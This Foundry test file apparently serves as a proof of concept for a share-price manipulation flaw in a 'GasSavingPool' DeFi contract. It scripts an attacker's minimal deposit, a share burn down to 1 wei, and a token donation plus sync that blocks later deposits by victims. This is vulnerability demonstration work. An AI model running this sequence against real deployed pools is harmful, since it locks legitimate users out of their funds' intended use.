// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.16;

import "forge-std/Test.sol";
import "../../contracts/GasSavingPool/impl/GSP.sol";
import "../../contracts/mock/MockERC20.sol";

/**
 * @title SharePriceManipulationExploitTest
 * @notice Demonstrates the share price manipulation vulnerability that leads to DOS
 * 
 * Attack Flow:
 * 1. Attacker initializes pool with minimal deposit (1001 wei)
 * 2. Attacker burns 1000 shares, keeping only 1 wei of totalSupply
 * 3. Attacker donates large amounts of tokens and syncs reserves
 * 4. Legitimate users cannot deposit due to share calculation rounding to 0
 * 
 * Root Cause:
 * - Initial share calculation allows minimal deposits without protection
 * - Share burning reduces totalSupply to 1 wei
 * - Direct token transfers inflate reserves without minting shares
 * - Subsequent deposits calculate shares = totalSupply * mintRatio
 * - With totalSupply = 1 and inflated reserves, mintRatio rounds down
 * - Shares < 1000 causes _mint() to revert with "MINT_AMOUNT_NOT_ENOUGH"
 */
contract SharePriceManipulationExploitTest is Test {
    GSP public gsp;
    MockERC20 public baseToken;
    MockERC20 public quoteToken;
    
    address public attacker = address(0x1337);
    address public victim = address(0xdead);
    address public maintainer = address(0xfee);
    
    // Attack parameters
    uint256 constant INITIAL_DEPOSIT = 1001;
    uint256 constant SHARES_TO_BURN = 1000;
    uint256 constant DONATION_AMOUNT = 1000e18;
    
    function setUp() public {
        // Deploy mock tokens
        baseToken = new MockERC20("Base Token", "BASE", 18);
        quoteToken = new MockERC20("Quote Token", "QUOTE", 18);
        
        // Deploy GSP with standard parameters
        // i = 1e18 (1:1 price ratio)
        // k = 0 (no slippage for simplicity)
        // lpFeeRate = 0
        // mtFeeRate = 0
        gsp = new GSP();
        gsp.init(
            address(this),           // maintainer
            address(baseToken),      // baseToken
            address(quoteToken),     // quoteToken
            0,                       // lpFeeRate (0%)
            0,                       // mtFeeRate (0%)
            1e18,                    // i (price = 1)
            0,                       // k (no slippage)
            false                    // isOpenTWAP
        );
        
        // Fund attacker and victim with tokens
        baseToken.mint(attacker, 10000e18);
        quoteToken.mint(attacker, 10000e18);
        baseToken.mint(victim, 10000e18);
        quoteToken.mint(victim, 10000e18);
    }
    
    function testSharePriceManipulationDOS() public {
        console.log("=== Share Price Manipulation & DOS Attack ===\n");
        
        // ============ STEP 1: Initial Minimal Deposit ============
        console.log("STEP 1: Attacker initializes pool with minimal deposit");
        vm.startPrank(attacker);
        
        // Transfer minimal amounts to GSP
        baseToken.transfer(address(gsp), INITIAL_DEPOSIT);
        quoteToken.transfer(address(gsp), INITIAL_DEPOSIT);
        
        // Buy shares - this will mint shares based on minimum balance
        (uint256 initialShares, , ) = gsp.buyShares(attacker);
        
        console.log("  Initial deposit (base):", INITIAL_DEPOSIT);
        console.log("  Initial deposit (quote):", INITIAL_DEPOSIT);
        console.log("  Shares minted:", initialShares);
        console.log("  Total supply:", gsp.totalSupply());
        
        // Verify initial state
        assertEq(initialShares, INITIAL_DEPOSIT, "Initial shares should equal deposit");
        assertEq(gsp.totalSupply(), INITIAL_DEPOSIT, "Total supply should equal initial shares");
        
        vm.stopPrank();
        console.log("");
        
        // ============ STEP 2: Burn Shares to Reduce Total Supply ============
        console.log("STEP 2: Attacker burns shares to reduce totalSupply to 1 wei");
        vm.startPrank(attacker);
        
        // Sell 1000 shares, keeping only 1 wei
        gsp.sellShares(
            SHARES_TO_BURN,
            attacker,
            0,  // baseMinAmount
            0,  // quoteMinAmount
            "",
            block.timestamp
        );
        
        uint256 remainingShares = gsp.totalSupply();
        console.log("  Shares burned:", SHARES_TO_BURN);
        console.log("  Remaining totalSupply:", remainingShares);
        
        // Verify totalSupply is now 1 wei
        assertEq(remainingShares, 1, "Total supply should be 1 wei after burning");
        
        vm.stopPrank();
        console.log("");
        
        // ============ STEP 3: Inflate Reserves via Donation ============
        console.log("STEP 3: Attacker donates tokens to inflate reserves");
        vm.startPrank(attacker);
        
        // Get reserves before donation
        (uint256 baseReserveBefore, uint256 quoteReserveBefore) = gsp.getVaultReserve();
        console.log("  Base reserve before:", baseReserveBefore);
        console.log("  Quote reserve before:", quoteReserveBefore);
        
        // Donate large amounts directly to the contract
        baseToken.transfer(address(gsp), DONATION_AMOUNT);
        quoteToken.transfer(address(gsp), DONATION_AMOUNT);
        
        // Sync reserves to update internal accounting
        gsp.sync();
        
        // Get reserves after donation
        (uint256 baseReserveAfter, uint256 quoteReserveAfter) = gsp.getVaultReserve();
        console.log("  Base reserve after:", baseReserveAfter);
        console.log("  Quote reserve after:", quoteReserveAfter);
        console.log("  Total supply (unchanged):", gsp.totalSupply());
        
        vm.stopPrank();
        console.log("");
        
        // ============ STEP 4: Demonstrate DOS on Legitimate User ============
        console.log("STEP 4: Legitimate user attempts to deposit");
        vm.startPrank(victim);
        
        // Victim tries to deposit a reasonable amount (100e18)
        uint256 victimDeposit = 100e18;
        baseToken.transfer(address(gsp), victimDeposit);
        quoteToken.transfer(address(gsp), victimDeposit);
        
        console.log("  Victim deposit amount:", victimDeposit);
        
        // Calculate expected shares (will be 0 due to rounding)
        // mintRatio = victimDeposit / baseReserveAfter
        // shares = totalSupply * mintRatio = 1 * (100e18 / ~1000e18) = 0
        uint256 expectedMintRatio = (victimDeposit * 1e18) / baseReserveAfter;
        uint256 expectedShares = (remainingShares * expectedMintRatio) / 1e18;
        
        console.log("  Expected mintRatio (wad):", expectedMintRatio);
        console.log("  Expected shares:", expectedShares);
        console.log("  Required shares for _mint():", 1001);
        
        // Attempt to buy shares - should revert
        vm.expectRevert(bytes("MINT_AMOUNT_NOT_ENOUGH"));
        gsp.buyShares(victim);
        
        console.log("  Result: Transaction REVERTED with 'MINT_AMOUNT_NOT_ENOUGH'");
        
        vm.stopPrank();
        console.log("");
        
        // ============ STEP 5: Calculate Required Deposit ============
        console.log("STEP 5: Calculate minimum deposit to bypass DOS");
        
        // For shares > 1000, we need:
        // shares = totalSupply * mintRatio > 1000
        // 1 * mintRatio > 1000
        // mintRatio > 1000 (in wad: > 1000e18)
        // userInput / reserve > 1000
        // userInput > 1000 * reserve
        
        uint256 requiredDeposit = (1001 * baseReserveAfter) / remainingShares;
        console.log("  Required deposit to mint shares:", requiredDeposit);
        console.log("  Victim's attempted deposit:", victimDeposit);
        console.log("  Ratio (required/attempted):", requiredDeposit / victimDeposit);
        
        // Verify the required deposit is economically prohibitive
        assertTrue(
            requiredDeposit > victimDeposit * 1000,
            "Required deposit should be >1000x victim's deposit"
        );
        
        console.log("\n=== Attack Successful: Pool is DOS'd ===");
        console.log("Cost to attacker:", INITIAL_DEPOSIT + DONATION_AMOUNT);
        console.log("Impact: Legitimate users cannot deposit unless they provide >1000x reserves");
    }
    
    function testSuccessfulDepositAfterAttack() public {
        // Run the attack first
        testSharePriceManipulationDOS();
        
        console.log("\n=== Attempting Deposit with Sufficient Amount ===");
        
        // Get current reserves
        (uint256 baseReserve, uint256 quoteReserve) = gsp.getVaultReserve();
        uint256 totalSupply = gsp.totalSupply();
        
        // Calculate required deposit (slightly more than 1001x reserves)
        uint256 requiredDeposit = ((1001 * baseReserve) / totalSupply) + 1e18;
        
        vm.startPrank(victim);
        
        // Mint additional tokens for victim
        baseToken.mint(victim, requiredDeposit);
        quoteToken.mint(victim, requiredDeposit);
        
        // Transfer required amount
        baseToken.transfer(address(gsp), requiredDeposit);
        quoteToken.transfer(address(gsp), requiredDeposit);
        
        // This should succeed
        (uint256 shares, , ) = gsp.buyShares(victim);
        
        console.log("  Deposit amount:", requiredDeposit);
        console.log("  Shares received:", shares);
        console.log("  Result: SUCCESS (but economically prohibitive)");
        
        assertTrue(shares > 1000, "Should mint shares successfully with large deposit");
        
        vm.stopPrank();
    }
}
